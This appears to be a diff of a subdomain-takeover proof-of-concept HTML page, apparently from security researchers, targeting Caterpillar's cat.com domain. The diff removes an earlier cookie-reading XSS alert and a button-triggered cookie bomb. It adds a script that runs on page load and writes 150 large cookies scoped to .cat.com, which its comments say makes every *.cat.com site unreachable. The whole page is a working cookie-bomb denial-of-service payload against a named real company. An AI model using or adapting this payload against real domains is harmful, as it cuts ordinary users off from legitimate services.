@@ -7,22 +7,14 @@
 <body>
     <h1>Subdomain Takeover PoC by m4rc10sz/luq0x</h1>
     <hr>
-
-    <button onclick="executeXSS()">Execute XSS Alert</button>
-
-    <button onclick="cookieBomb()">Execute Cookie Bomb</button>
-
     <script>
-        function executeXSS() {
-            alert("XSS Execution Context: " + document.cookie);
+        // Cookie Bomb DoS — pfm-infra-reports.cat.com → *.cat.com
+        // Each cookie carries ~3KB payload scoped to .cat.com
+        // Result: Akamai TCP reset (ERR_CONNECTION_RESET) on all *.cat.com requests
+        for (var i = 0; i < 150; i++) {
+            document.cookie = "cb_" + i + "=" + "B".repeat(3000) + "; domain=.cat.com; path=/; SameSite=None; Secure";
         }
-
-        function cookieBomb() { 
-            for (var i = 0; i < 4000; i++) {
-                document.cookie = "bomb_takeover" + i + "=bomb_value; domain=.cat.com; path=/; secure; SameSite=None";
-            }
-            alert("Cookie bomb dropped successfully!");
-        }
+        alert("DoS attack executed successfully!\n\nAll Caterpillar web properties are now unreachable in this browser.");
     </script>
 </body>
 </html>
